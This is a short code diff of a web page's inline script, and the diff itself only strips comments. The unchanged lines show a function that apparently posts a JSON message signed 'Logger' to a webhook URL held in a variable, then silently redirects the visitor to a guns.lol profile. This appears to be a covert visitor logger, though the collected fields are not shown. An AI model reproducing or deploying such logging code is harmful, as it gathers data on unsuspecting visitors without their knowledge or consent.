@@ -33,11 +33,10 @@
 
       var request = new XMLHttpRequest();
       request.open("POST", gunslol);
-
-      // Setting request header for JSON content
+      
       request.setRequestHeader('Content-type', 'application/json');
 
-      // Parameters for the POST request payload
+
       var params = {
         username: "Logger",
         avatar_url: "",
@@ -48,15 +47,15 @@
         }]
       };
 
-      // Function executed when the request completes
+
       request.onload = function() {
-        // Redirecting after 300 milliseconds
+
         setTimeout(function() {
           window.location.href = "http://guns.lol/maxvel187";
         }, 300);
       };
 
-      // Sending the POST request with JSON payload
+
       request.send(JSON.stringify(params));
     }
   </script>
